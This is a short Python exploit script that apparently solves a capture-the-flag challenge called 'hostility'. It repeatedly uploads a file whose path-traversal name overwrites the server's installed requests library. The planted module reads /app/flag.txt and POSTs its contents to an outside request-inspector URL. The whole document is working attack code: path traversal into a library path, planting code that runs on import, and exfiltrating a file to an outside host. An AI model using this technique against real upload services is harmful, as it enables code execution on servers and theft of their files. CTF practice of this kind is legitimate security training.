from itertools import count
from time import sleep, time
import requests

init = time()
for i in count():
  dt = round(time()-init, 2)
  print(f'[+] {dt=}')
  res = requests.post(
    "https://hostility.chal.imaginaryctf.org/upload",
    # "http://localhost:1338/upload",
    files={'file':(
      "../../usr/local/lib/python3.8/dist-packages/requests/__init__.py",
      b'''
import urllib.request

print(f'[+] pwned!')
url = 'https://requestinspector.com/inspect/01g85s4t9q77sty57kf0fyhksy'
urllib.request.urlopen(urllib.request.Request(url, data=open("/app/flag.txt", "rb").read(), method='POST'))
def get(url):
 pass
'''
    )}
  )
  print(res.text)
  sleep(5)
